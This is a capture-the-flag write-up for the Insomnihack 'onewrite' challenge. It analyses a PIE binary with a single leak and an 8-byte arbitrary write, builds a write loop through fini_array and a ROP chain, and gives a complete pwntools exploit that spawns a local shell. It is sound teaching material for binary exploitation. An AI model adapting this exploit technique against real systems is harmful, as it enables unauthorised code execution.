# Insomnihack teaser 2018 onewrite

This writeup is based off of: https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-01-19-Insomni-Hack-Teaser/README.md#onewrite

Let's take a look at the binary:
```
$	file onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786 
onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, for GNU/Linux 3.2.0, with debug_info, not stripped
$	pwn checksec onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786 
[!] Did not find any GOT entries
[*] '/home/guyinatuxedo/Desktop/insomnihack/pwn/onewrite/onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So we can see that we have a `64` bit binary with a Stack Canary, Non Executable stack, and PIE enabled. Let's run it:

```
$	./onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786 
All you need to pwn nowadays is a leak and a qword write they say...
What do you want to leak ?
1. stack
2. pie
 > 1
0x7fff2fbeef90
address : 0x7fff2fbeef90
data : 10
```

So it gives us an option between a stack and pie infoleak, prompts us for a stack address, and some data. When we look at the main function in IDA, we see that there is a function `do_leak` that is called.:

```
int __fastcall do_leak(__int64 a1, int (*a2)(void))
{
  __int64 intChoice; // rax@1

  puts("What do you want to leak ?");
  puts("1. stack");
  puts("2. pie");
  printf((unsigned __int64)" > ");
  LODWORD(intChoice) = read_int_3(" > ");
  if ( intChoice == 1 )
  {
    printf((unsigned __int64)&off_880EA);
  }
  else if ( intChoice == 2 )
  {
    printf((unsigned __int64)&off_880EA);
  }
  else
  {
    puts("Nope");
  }
  return do_overwrite();
}
```

This function gives us the option between either `1` for a stack leak or `2` for a pie leak, and then prints the corresponding address. After that it runs the `do_overwrite` function. In the code, it looks like both options print the same thing, however this is an issue with IDA's decompilation. When we look at the actual printf statements in gdb, we see that they do get different arguments.

```
Guessed arguments:
arg[0]: 0x7ffff7dd20ea --> 0x65706f4e000a7025 ('%p\n')
arg[1]: 0x7fffffffde40 --> 0x7ffff7d53780 (<__libc_csu_init>:	push   r15)

.	.	.

0x7fffffffde40:	0x00007ffff7d53780
gdb-peda$ vmmap
Start              End                Perm	Name
0x00007ffff7d4a000 0x00007ffff7df8000 r-xp	/home/guyinatuxedo/Desktop/insomnihack/pwn/onewrite/onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786
0x00007ffff7ff2000 0x00007ffff7ff5000 r--p	[vvar]
0x00007ffff7ff5000 0x00007ffff7ff7000 r-xp	[vdso]
0x00007ffff7ff7000 0x00007ffff7ffe000 rw-p	/home/guyinatuxedo/Desktop/insomnihack/pwn/onewrite/onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786
0x00007ffff7ffe000 0x00007ffff8022000 rw-p	[heap]
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

Here we can see is what the printf args look like if we select option `1` for the stack. We can see that the format string is `%p` for pointer, and that the argument is the address `0x7fffffffde40`, which we can see is in the stack region of memory. In addition to that after we continue, we see that it is the address printed.

```
Guessed arguments:
arg[0]: 0x7ffff7dd20ea --> 0x65706f4e000a7025 ('%p\n')
arg[1]: 0x7ffff7d52a15 (<do_leak>:	sub    rsp,0x18)

.	.	.

0x00007ffff7d4a000 0x00007ffff7df8000 r-xp	/home/guyinatuxedo/Desktop/insomnihack/pwn/onewrite/onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786
0x00007ffff7ff2000 0x00007ffff7ff5000 r--p	[vvar]
0x00007ffff7ff5000 0x00007ffff7ff7000 r-xp	[vdso]
0x00007ffff7ff7000 0x00007ffff7ffe000 rw-p	/home/guyinatuxedo/Desktop/insomnihack/pwn/onewrite/onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786
0x00007ffff7ffe000 0x00007ffff8022000 rw-p	[heap]
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

Here is the case if we select the `PIE` infoleak. We can see that our leak is between `0x00007ffff7d4a000` and `0x00007ffff7df8000` so we do indeed have a PIE infoleak. In addition to that, we can see that the address we are being given is that of `do_leak`. Now onto the `do_overwrite` function:

```
int do_overwrite()
{
  __int64 address; // rax@1
  __int64 targetAddress; // ST08_8@1

  printf((unsigned __int64)"address : ");
  LODWORD(address) = read_int_3("address : ");
  targetAddress = address;
  printf((unsigned __int64)"data : ");
  return read(0LL, targetAddress, 8LL);
}
```

Here we see we are prompted for an address, which then we can write `8` bytes worth of data to that address. So we have an `8` byte write what where.

### Stack and PIE infoleaks, and write loop

So we have either a Stack or a PIE infoleak, and a write what where. With this, we can write over the `rip` register (assuming we pick the stack infoleak so we know where it is in memory) with the value of `do_leak` so we will be able to select the PIE infoleak a second time, so we will have both infoleaks. However the issue is if we do this, we will have to use the write to write over the RIP register, so we wouldn't actually be able to write any part of our ROP chain, only to get an infoleak. So we can do this to get the initial PIE and Stack infoleaks, however after that we will need to come up with a different way of executing this same code path.

What we can do is write a hook to the `_fini_array` table, which contains a list of functions that are ran when the program ends. That way we can just write a hook for the `do_overwrite` function, and have it call `do_overwrite` when the program exits (specifically when `exit` is called after the main function returns). However there is an obstacle with this, which that after the function is called the program will continue to exit, so if we only write one entry in the table, we will only get one additional run. Luckily for us, there are two entries in that table for us to use:

```
gdb-peda$ info files
Symbols from "/home/guyinatuxedo/Desktop/insomnihack/pwn/onewrite/onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786".
Native process:
	Using the running image of child process 25558.
	While running this, GDB does not access memory from...
Local exec file:
	`/home/guyinatuxedo/Desktop/insomnihack/pwn/onewrite/onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786', file type elf64-x86-64.
	Entry point: 0x7ffff7d528b0
	0x00007ffff7d4a200 - 0x00007ffff7d4a220 is .note.ABI-tag
	0x00007ffff7d4a220 - 0x00007ffff7d4a23c is .gnu.hash
	0x00007ffff7d4a240 - 0x00007ffff7d4a258 is .dynsym
	0x00007ffff7d4a258 - 0x00007ffff7d4a259 is .dynstr
	0x00007ffff7d4a260 - 0x00007ffff7d51e38 is .rela.dyn
	0x00007ffff7d51e38 - 0x00007ffff7d52060 is .rela.plt
	0x00007ffff7d52060 - 0x00007ffff7d52077 is .init
	0x00007ffff7d52080 - 0x00007ffff7d52280 is .plt
	0x00007ffff7d52280 - 0x00007ffff7d522e0 is .plt.got
	0x00007ffff7d522e0 - 0x00007ffff7dd11a0 is .text
	0x00007ffff7dd11a0 - 0x00007ffff7dd1f6c is __libc_freeres_fn
	0x00007ffff7dd1f70 - 0x00007ffff7dd208b is __libc_thread_freeres_fn
	0x00007ffff7dd208c - 0x00007ffff7dd2095 is .fini
	0x00007ffff7dd20a0 - 0x00007ffff7deb25c is .rodata
	0x00007ffff7deb25c - 0x00007ffff7dece98 is .eh_frame_hdr
	0x00007ffff7dece98 - 0x00007ffff7df73bc is .eh_frame
	0x00007ffff7df73bc - 0x00007ffff7df746b is .gcc_except_table
	0x00007ffff7ff7f80 - 0x00007ffff7ff7fa0 is .tdata
	0x00007ffff7ff7fa0 - 0x00007ffff7ff7fd0 is .tbss
	0x00007ffff7ff7fa0 - 0x00007ffff7ff7fb0 is .init_array
	0x00007ffff7ff7fb0 - 0x00007ffff7ff7fc0 is .fini_array
	0x00007ffff7ff7fc0 - 0x00007ffff7ffad54 is .data.rel.ro
	0x00007ffff7ffad58 - 0x00007ffff7ffaef8 is .dynamic
	0x00007ffff7ffaef8 - 0x00007ffff7ffaff0 is .got
	0x00007ffff7ffb000 - 0x00007ffff7ffb110 is .got.plt
	0x00007ffff7ffb120 - 0x00007ffff7ffcbf0 is .data
	0x00007ffff7ffcbf0 - 0x00007ffff7ffcc38 is __libc_subfreeres
	0x00007ffff7ffcc40 - 0x00007ffff7ffd2e8 is __libc_IO_vtables
	0x00007ffff7ffd2e8 - 0x00007ffff7ffd2f0 is __libc_atexit
	0x00007ffff7ffd2f0 - 0x00007ffff7ffd2f8 is __libc_thread_subfreeres
	0x00007ffff7ffd300 - 0x00007ffff7ffe9b8 is .bss
	0x00007ffff7ffe9b8 - 0x00007ffff7ffe9e0 is __libc_freeres_ptrs
	0x00007ffff7ff5120 - 0x00007ffff7ff515c is .hash in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff5160 - 0x00007ffff7ff51a8 is .gnu.hash in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff51a8 - 0x00007ffff7ff5298 is .dynsym in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff5298 - 0x00007ffff7ff52f6 is .dynstr in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff52f6 - 0x00007ffff7ff530a is .gnu.version in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff5310 - 0x00007ffff7ff5348 is .gnu.version_d in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff5348 - 0x00007ffff7ff5468 is .dynamic in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff5468 - 0x00007ffff7ff57a8 is .rodata in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff57a8 - 0x00007ffff7ff57e4 is .note in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff57e4 - 0x00007ffff7ff5820 is .eh_frame_hdr in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff5820 - 0x00007ffff7ff5968 is .eh_frame in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff5970 - 0x00007ffff7ff5f5a is .text in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff5f5a - 0x00007ffff7ff5fe9 is .altinstructions in system-supplied DSO at 0x7ffff7ff5000
	0x00007ffff7ff5fe9 - 0x00007ffff7ff600b is .altinstr_replacement in system-supplied DSO at 0x7ffff7ff5000
```

We can see that the `fini_array` starts at `0x00007ffff7ff7fb0`, and ends at `0x00007ffff7ff7fc0`, which gives us `0x10` (16) bytes of room, which can fit two 8 byte entries. Since we have two entires, we can run `do_ovwerwrite` twice (the entries are called in reverse order). We can use the first one to call `do_overwrite` and get our write for that iteration, and use the second one to write `__libc_csu_fini` (which is the function that runs the functions in `fini_array`) to the return address, so we can repeat the loop. The return address that we write over will have to be that of `__libc_csu_fini`, since that is the function which will run our `do_overwrite` calls. We can look up the address in gdb:

```
gdb-peda$ b *__libc_csu_fini
Breakpoint 1 at 0x9810
gdb-peda$ r

.	.	.

Breakpoint 1, 0x00007ffff7d53810 in __libc_csu_fini ()
gdb-peda$ i f
Stack level 0, frame at 0x7fffffffde00:
 rip = 0x7ffff7d53810 in __libc_csu_fini; saved rip = 0x7ffff7d59160
 called by frame at 0x7fffffffde50
 Arglist at 0x7fffffffddf0, args: 
 Locals at 0x7fffffffddf0, Previous frame's sp is 0x7fffffffde00
 Saved registers:
  rip at 0x7fffffffddf8
```

In this case, the difference is `0x7fffffffde40 - 0x7fffffffddf8 = 72` (the stack leak this time was `0x7fffffffde40`). When we set up the loop (after we get the PIE and Stack infoleaks), we will want to write the second entry of `fini_array` since the functions are called backwards (so the last entry is called first). Then we will write to the first entry of `fini_array`, and then finally the return address, so we can loop around another write.

### ROP

Now that we have setup a loop which we can use to write as many QWORDS as we want, we can now focus on building our ROP Chain. Since this binary is statically linked, there is no libc so we can't do a return 2 libc attack, and since the binary doesn't have the function `system` we can do a return 2 system attack. That just leaves building out a ROP chain. We will store the ROP chain below `rsp`, and use an `add rsp, x` ROP gadget to pivot over to our ROP chain (since addresses on the stack build towards lower addresses). Also we will need to store the string "/bin/sh" somewhere in memory, since it isn't in the binary by default. We can just store it at an address of our chooisng, that we know where it is and doesn't mess with other things that we need. Also every time we go through the loop with `__libc_csu_fini`, due to how the memory works we need to shift our stack addresses (the return address of `__libc_csu_fini` and where we are writing the ROP chain) up by `8`. Also for the ROP chain itself, we will want a ROP Chain that does this:

```
pop rdi, "/bin/sh" adr ; ret
pop rsi, 0x0           ; ret
pop rdx, 0x0           ; ret
pop rax, 59			   ; ret
syscall
```

we can find those ROP gadgets using ROPgadget like this:
```
$	python ROPgadget.py --binary onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786 | grep pop | grep rdi | less
```

we can use Ropper to find a syscall:
```
$	python Ropper.py --file onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786 | grep syscall

.	.	.

0x000000000000917c: syscall; 
```

last thing we will need is the stack pivot gagdet. This specific gadget adds a value to rsp which will be nice to work with for our offsets:

```
0x00000000000106f3: add rsp, 0xd0; pop rbx; ret; 
```

### exploit

So our exploit will start off by leaking the stack address, using it to calculate the return address, and writing over the return address with the value of `do_leak`. Then it will get a PIE infoleak, and setup the Qwords write loop by wring two entries of `do_overwrite` to the `fini_array` (from back to front). Then it will write over the `__libc_csu_fini` return address with itself to trigger the loop again. Each time the loop runs, we will write 8 bytes of the ROP chain. After that, we will just use a ROP gadget to pivot the stack to the ROP chain and get a shell. Putting it all together here is our exploit:

```
# This exploit is based off of: https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-01-19-Insomni-Hack-Teaser/README.md#onewrite

from pwn import *


target = process('./onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786')
elf = ELF('onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786')
#gdb.attach(target)

# Establish helper functions
def leak(opt):
    target.recvuntil('>')
    target.sendline(str(opt))
    leak = target.recvline()
    leak = int(leak, 16)
    return leak

def write(adr, val, other = 0):
    target.recvuntil('address :')
    target.send(str(adr))
    target.recvuntil('data :')
    if other == 0:
        target.send(p64(val))
    else:
        target.send(val)

    

# First leak the Stack address, and calculate where the return address will be in do_overwrite
stackLeak = leak(1)
ripAdr = stackLeak + 0x18

# Calculate where the return address for __libc_csu_fini 
csiRipAdr = stackLeak - 72

# Write over the return address in do_overwrite with do_leak
write(ripAdr, p8(0x04), 1)

# Leak the PIE address of do leak
doLeakAdr = leak(2)

# Calculate the base of PIE  
pieBase = doLeakAdr - elf.symbols['do_leak']

# Calculate the address of the _fini_arr table, and the __libc_csu_fini function using the PIE base
finiArrAdr = pieBase + elf.symbols['__do_global_dtors_aux_fini_array_entry']
csuFini = pieBase + elf.symbols["__libc_csu_fini"]

# Calculate the position of do_overwrite
doOverwrite = pieBase + elf.symbols['do_overwrite']

# Write over return address in do_overwrite with do_overwrite
write(ripAdr, p8(0x04), 1)
leak(1)

# Write over the two entires in _fini_arr table with do_overwrite, and restart the loop
write(finiArrAdr + 8, doOverwrite)
write(finiArrAdr, doOverwrite)
write(csiRipAdr, csuFini)

# Increment stack address due to new iteration of loop
csiRipAdr += 8

# Establish rop gagdets, and "/bin/sh" address
popRdi = pieBase + 0x84fa
popRsi = pieBase + 0xd9f2
popRdx = pieBase + 0x484c5
popRax = pieBase + 0x460ac
syscall = pieBase + 0x917c
binshAdr = pieBase + 0x2b4500
pivotGadget = pieBase + 0x106f3

# Function which we will use to write Qwords using loop
def writeQword(adr, val):
    global csiRipAdr
    write(csiRipAdr, csuFini)
    csiRipAdr += 8
    write(adr, val)

# first wite "/bin/sh" to the designated place in memory
writeQword(binshAdr, u64("/bin/sh\x00"))


'''
Our ROP Chain will do this:

pop rdi ptr to "/bin/sh";   ret
pop rsi 0 ; ret
pop rdx 0 ; ret
pop rax 0x59 ; ret
syscall
'''


# write the ROP chain
writeQword(csiRipAdr + 0x108, popRdi)
writeQword(csiRipAdr + 0x108, binshAdr)
writeQword(csiRipAdr + 0x108, popRsi)
writeQword(csiRipAdr + 0x108, 0)
writeQword(csiRipAdr + 0x108, popRdx)
writeQword(csiRipAdr + 0x108, 0)
writeQword(csiRipAdr + 0x108, popRax)
writeQword(csiRipAdr + 0x108, 59)
writeQword(csiRipAdr + 0x108, syscall)


# write the ROP pivot gadget to the return address of do_overwrite, which will trigger the rop chain
write(stackLeak - 0x10, pivotGadget)

# drop to an interactive shell
target.interactive()
```

and when we run it:

```
$	python exploit.py 
[+] Starting local process './onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786': pid 27052
[!] Did not find any GOT entries
[*] '/home/guyinatuxedo/Desktop/insomnihack/pwn/onewrite/onewrite-390417ba15a4e5ad7ea0507a21e7dc1ef03eb1805750a0e786f2066a68445786'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
 $ w
 22:40:57 up 1 day,  6:20,  1 user,  load average: 0.00, 0.03, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               Thu19   ?xdm?   4:33   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
```
